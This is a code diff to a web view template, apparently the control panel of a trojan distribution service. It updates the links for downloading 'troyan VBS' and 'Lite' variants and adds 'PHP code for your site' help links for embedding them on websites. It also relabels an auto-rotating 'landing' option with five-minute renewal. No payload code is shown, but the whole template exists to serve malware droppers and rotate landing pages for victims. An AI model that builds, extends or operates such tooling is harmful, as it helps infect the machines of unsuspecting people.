@@ -43,23 +43,23 @@
 
 <div class="form-group">
     <h5>Troyan VBS</h5>
-    <a href="@Model.Server/GetVbs">Download troyan VBS</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-    <a href="@Model.Server/1/2/BuildVbs">Buid troyan VBS</a>
+    <a href="@Model.Server/@Model.Id/@Model.Random()/none/GetVbs">Download troyan VBS</a>
     <span class="text-danger"></span>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <a target="_blank" href="/Readme/?chapter=GetVbs">PHP code for your site</a>
 </div>
 
 <div class="form-group">
     <h5>Lite Troyan VBS</h5>
-    <a href="@Model.Server/GetLiteVbs">Download Lite troyan VBS</a>
-    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-    <a href="@Model.Server/1/2/BuildLiteVbs">Buid Lite troyan VBS</a>
-    <span class="text-danger"></span>
+    <a href="@Model.Server/@Model.Id/@Model.Random()/none/GetLightVbs">Download troyan VBS Lite</a>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <a target="_blank" href="/Readme/?chapter=GetLightVbs">PHP code for your site</a>
 </div>
 
 <hr/>
 <div class="form-group">
     <label>
-        <input type="checkbox" name="LandingAuto" value="true" @(Model.LandingAuto ? "checked" : "")/> Auto Landing
+        <input type="checkbox" name="LandingAuto" value="true" @(Model.LandingAuto ? "checked" : "")/> Auto Landing (5 minutes based renewal)
     </label>
     <span class="text-danger"></span>
 
